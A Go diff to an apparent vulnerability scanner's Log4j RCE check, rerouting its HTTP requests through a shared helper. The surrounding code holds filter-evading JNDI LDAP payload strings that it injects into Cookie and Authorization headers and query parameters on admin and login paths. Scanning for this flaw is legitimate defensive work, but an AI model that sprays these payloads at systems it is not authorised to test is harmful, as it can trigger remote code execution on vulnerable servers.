@@ -4,6 +4,7 @@ import (
 	"fmt"
 	plugin "github.com/deenrookie/kunpeng-plus/pocs"
 	"github.com/deenrookie/kunpeng-plus/utils"
+	"github.com/opensec-cn/kunpeng/util"
 	"net/http"
 	"strings"
 	"time"
@@ -52,7 +53,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 		"${j${aaa::::-n}d${:-}i:ldap://}",
 		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-}p://",
 	}
-	
+
 	reqPaths := []string{
 		"/admin",
 		"/login",
@@ -69,12 +70,12 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 		"POST",
 	}
 
-	client := http.Client{
-		//Transport: &http.Transport{
-		//	// 设置代理
-		//	Proxy: http.ProxyURL(uri),
-		//},
-	}
+	//client := http.Client{
+	//	//Transport: &http.Transport{
+	//	//	// 设置代理
+	//	//	Proxy: http.ProxyURL(uri),
+	//	//},
+	//}
 	// fmt.Println(randStr)
 
 	for _, payload := range payloads {
@@ -97,7 +98,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("Cookie", fullPayload)
 					request.Header.Set("Authorization", fullPayload)
 					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-					_, _ = client.Do(request)
+					_, _ = util.RequestDo(request, false)
 				}
 
 				request, _ = http.NewRequest(method, URL+reqPath + "?id=" + fullPayload, nil)
@@ -109,7 +110,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("Cookie", fullPayload)
 					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 					request.Header.Set("Authorization", fullPayload)
-					_, _ = client.Do(request)
+					_, _ = util.RequestDo(request, false)
 				}
 				// fmt.Println(count)
 				// count++
